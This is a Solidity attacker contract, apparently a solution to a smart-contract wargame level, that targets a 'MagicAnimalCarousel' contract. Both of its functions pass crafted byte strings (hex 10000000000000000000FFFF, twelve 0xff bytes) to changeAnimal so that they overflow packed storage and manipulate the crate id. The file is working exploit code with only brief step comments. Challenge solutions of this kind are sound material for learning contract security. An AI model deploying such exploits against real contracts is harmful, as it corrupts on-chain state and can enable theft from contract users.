// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IMagicAnimalCarousel {
        function setAnimalAndSpin(string calldata animal) external ;
        function changeAnimal(string calldata animal, uint256 crateId) external ;
        function currentCrateId() external returns(uint256);

}
contract MagicAnimalCarouselAttacker{
    address magicAnimalCarouselAddr;
    constructor(address _magicAnimalCarouselAddr){
        magicAnimalCarouselAddr = _magicAnimalCarouselAddr;
    }

    function attack() external {
        IMagicAnimalCarousel carousel;
        carousel = IMagicAnimalCarousel(magicAnimalCarouselAddr);

        // Step 1: Add animal to first crate
        carousel.setAnimalAndSpin("Dog");

        // Step 2: Manipulate nextCrateId
        string memory exploitString = string(abi.encodePacked(hex"10000000000000000000FFFF"));
        carousel.changeAnimal(exploitString, 1);

        // Step 3: Add animal to 65535th crate
        carousel.setAnimalAndSpin("Parrot");
    }

    function attack2() public {
        IMagicAnimalCarousel carousel;
        carousel = IMagicAnimalCarousel(magicAnimalCarouselAddr);
        carousel.setAnimalAndSpin("WZM");
        uint256 currentID = carousel.currentCrateId();
        bytes memory strBytes = new bytes(12);
        for (uint i = 0; i < 12; i++) {
            strBytes[i] = bytes1(0xff);
        }
        string memory createString = string(strBytes);
        carousel.changeAnimal(createString, currentID);
        carousel.setAnimalAndSpin("AAA");
    }
}